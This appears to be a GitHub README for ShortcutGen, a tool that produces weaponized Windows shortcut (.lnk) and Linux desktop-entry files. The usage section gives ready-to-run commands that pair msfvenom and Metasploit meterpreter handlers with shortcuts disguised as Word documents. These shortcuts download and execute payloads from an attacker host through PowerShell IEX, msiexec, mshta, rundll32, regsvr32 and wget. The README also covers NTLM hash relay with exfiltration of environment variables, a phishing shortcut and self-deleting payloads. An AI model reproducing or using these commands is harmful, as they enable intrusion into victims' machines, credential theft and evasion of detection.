# ShortcutGen

**ShortcutGen (short for Shortcut Generator)** is a script that generates shortcut files as weaponized payloads. Ever since [lnk2pwn](https://github.com/it-gorillaz/lnk2pwn) was at it's prime to generate windows shortcut (`.lnk`) files. However, security vendors were able to trigger the static signature as malicious due to it's outdated library. [MisterioLNK](https://github.com/K3rnel-Dev/MisterioLNK) exists but it's designed to work in the Windows operating system. I knew I needed something to get away from it to keep everything mobile in the Linux workspace. Providentially, all thanks to Microsoft for releasing [PowerShell](https://github.com/PowerShell/PowerShell) and `wine` are the solution to this problem. In addition, another attack vector for targeting Linux desktops is the desktop entry (`.desktop`).

## Installation

Run the installer as root. It'll install the required dependencies.

```
$ bash -c "$(curl --proto '=https' --tlsv1.2 -sSfL "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"

$ bash -c "$(wget -qO - "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"
```

## Help Menu

```
$ shortcutgen -h
Usage: shortcutgen [flags] -o <output>
Flags:
    -p, --payload                       Specify a payload module ('lnk', 'desktop').
    -c, --command                       Specify a command to execute.
    -a, --arguments                     Optionally pass the arguments (except it is
                                        mandatory for 'lnk' payload module).

    -i, --ip                            Specify an IP address/hostname (applies with
                                        'lnk' payload module).

    -e, --environment                   Optionally pass the environment variables to
                                        exfiltrate.

    -s, --share                         Specify an SMB share (applies with -h flag
                                        when it's optional for 'lnk' payload module).

    -f, --filename                      Specify a filename. It is optional when 'lnk'
                                        payload module is specified (applies with -h flag).
                                        For 'desktop' payload module it is mandatory.

    -ic, --icon                         Specify a custom icon.
    -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                        'normal' is set by default if not specified.
                                        The available windowstyles are: 'normal', 'maximized',
                                        and 'minimized'. For 'desktop' payload it is set to
                                        'false', the available options are: 'true' and 'false'.

    -wd, --workingdirectory             Specify a working directory.
    -o, --output                        Specify an output.
    -v, --version                       Display the program's version number.
    -h, --help                          Display the help menu.
```

## Usage

### 0x00 - Trojanized Shortcuts

#### Windows

Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it. Then use a `file.docx` word document as an icon that can be outputed from `libreoffice`.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-reflection -o payload.ps1

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; exploit"

$ sudo python -m http.server 80

$ shortcutgen -p lnk -c "powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
```

Generate the shell link while hosting a webserver to stage a MSI installer (`.msi`) payload to trigger it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o payload.msi

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"

$ sudo python -m http.server 80

$ shortcutgen -p lnk -c "msiexec.exe" -a "/quiet /qn /i http://<attacker_IP>/payload.msi" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
```

Generate the shell link then automatically hosting a staging HTA payload (`.hta`) using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.

```
$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"

$ shortcutgen -p lnk -c "mshta.exe" -a "http[s]://<attacker_IP>/payload.hta" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
```

Generate the shell link then automatically hosting a staging DLL payload (`.dll`) using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.

```
$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name payload.dll; set share staging; exploit"

$ shortcutgen -p lnk -c "rundll32.exe" -a "\\<attacker_IP>\staging\payload.dll,0" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
```

Generate the shell link then automatically hosting a staging scriptlet payload (`.sct`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"

$ shortcutgen -p lnk -c "regsvr32.exe" -a "/s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" -ic "file.docx" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
```

#### Linux

Generate the desktop entry then automatically hosting a python payload (`.py`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 0; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"

$ shortcutgen -p desktop -f "Document File" -c "python" -a "\"<payload>\"" -ic "libreoffice-writer" -wd "/tmp/" -w "false" -o payload.desktop
```

Generate the desktop entry then automatically hosting an ELF payload using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 7; set payload linux/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"

$ shortcutgen -p desktop -f "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown" -ic "libreoffice-writer" -wd "/tmp/" -w "false" -o payload.desktop
```

### 0x01 - Relay NTLM Hash

Specify the attacker's IP address.

```
$ shortcutgen -p lnk -i "192.168.1.4" -s "Documents" -f "document.docx" -o payload.lnk
```

Even a rouge hostname can trigger the DNS.

```
$ shortcutgen -p lnk -i "fileserver" -s "Documents" -f "document.docx" -o payload.lnk
```

To exfiltrate environment variables.

```
$ shortcutgen -p lnk -i "fileserver" -e "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS" -s "Documents" -f "document.docx" -w "minimized" -o payload.lnk
```

### 0x02 - Phishing

You can send a targeted phishing campaign using chromium-based web browsers in application mode from [mrd0x's blog post](https://mrd0x.com/phishing-with-chromium-application-mode/).

```
$ shortcutgen -p lnk -c "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -a "--app=http://192.168.1.4" -i "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -o Office365.lnk
```

### 0x03 - Defense Evasion

You can of course self delete the payload after execution.

```
$ shortcutgen -p lnk -c "C:\\Windows\\System32\\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" -i "C:\path\to" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
```

Including `.desktop` file.

```
$ shortcutgen -p desktop -f "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown;sleep 2; rm \$(pwd)/payload.desktop" -wd "/tmp/" -w "false" -o payload.desktop
```

## Limitations

The **HotKey** has not been implemented in `wine` so I can't make a feature for persistence. So much potential with this shortcut is gone :(

## FAQ (Frequent Asked Questions)

### Why didn't you use [pylnk](https://github.com/strayge/pylnk) library?

I could but I decided to implement a wrapper with `wine` which is much more suitable in a long term. Saves me a lot of trouble from reinventing my own library in case it gets abandoned. It's often best to explore more options to produce similar results.

### Can I use the techniques for my project or other tradecraft for my own arsenal?

It is highly encouraged of you to understand how the shortcut generator is being processed then outputted. The GNU GPLv3 copyleft license grants you the right to inspect the source code, modify it to your needs, and redistribute with your own copy along with the source code.

## Troubleshooting

### Uninstall

To uninstall the programs.

```
$ sudo rm -f /usr/local/src/shortcutgen.sh /usr/local/bin/shortcutgen
```

## References

- [lnk2pwn](https://github.com/it-gorillaz/lnk2pwn)

- [MisterioLNK](https://github.com/K3rnel-Dev/MisterioLNK)

- [LNKUp](https://github.com/Plazmaz/LNKUp)

- [pylnk](https://github.com/strayge/pylnk)

## Credits

- [tommelo](https://github.com/tommelo)

## Disclaimer

It is your responsibility depending on whatever the cause of your actions user. Remember that with great power comes great responsibility.
